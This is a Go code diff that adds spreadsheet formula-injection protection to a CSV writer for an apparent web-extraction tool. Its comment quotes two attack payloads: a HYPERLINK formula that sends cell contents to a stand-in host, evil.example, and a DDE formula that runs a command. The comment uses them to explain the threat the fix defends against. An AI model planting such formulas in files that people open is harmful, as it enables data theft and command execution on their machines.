@@ -59,17 +59,51 @@ func (d Dataset) WriteCSV(w io.Writer, provenance bool) error {
 	return cw.Error()
 }
 
-// cleanCell removes what a spreadsheet would misread.
+// cleanCell removes what a spreadsheet would misread, and defuses what it would
+// EXECUTE.
 //
 // A newline inside a quoted CSV field is legal and survives a correct reader, and
 // is misread by enough of them that a dataset opened in the wrong tool looks
 // corrupted. A tab likewise. Neither carries meaning in an extracted value.
+//
+// The second half is a security fix rather than a cosmetic one. Excel, LibreOffice
+// and Google Sheets evaluate a cell whose first character is =, +, - or @, so a
+// page containing
+//
+//	=HYPERLINK("http://evil.example?x="&A1,"click")
+//
+// becomes a live exfiltration link the moment somebody opens the file, and
+// =cmd|' /C calc'!A0 is the DDE variant. mole extracts from arbitrary web pages
+// into a file a user opens in a spreadsheet, which is the whole of that threat
+// model — and a probe confirmed every one of those payloads reached the output
+// untouched.
+//
+// The mitigation is the standard one: prefix a leading apostrophe, which every
+// spreadsheet treats as "the rest is text" and which a CSV parser reading the file
+// programmatically sees as one harmless character. Escaping the formula instead
+// would change the value; refusing the row would lose data over a rendering
+// concern.
 func cleanCell(s string) string {
 	s = strings.ReplaceAll(s, "\r\n", " ")
 	s = strings.ReplaceAll(s, "\n", " ")
 	s = strings.ReplaceAll(s, "\r", " ")
 	s = strings.ReplaceAll(s, "\t", " ")
-	return strings.TrimSpace(strings.Join(strings.Fields(s), " "))
+	s = strings.TrimSpace(strings.Join(strings.Fields(s), " "))
+	return defuseFormula(s)
+}
+
+// formulaLeaders are the characters a spreadsheet reads as "evaluate this".
+const formulaLeaders = "=+-@\t\r"
+
+// defuseFormula prefixes an apostrophe to a value a spreadsheet would evaluate.
+func defuseFormula(s string) string {
+	if s == "" {
+		return s
+	}
+	if strings.ContainsRune(formulaLeaders, rune(s[0])) {
+		return "'" + s
+	}
+	return s
 }
 
 func firstQuote(m Merged) string {
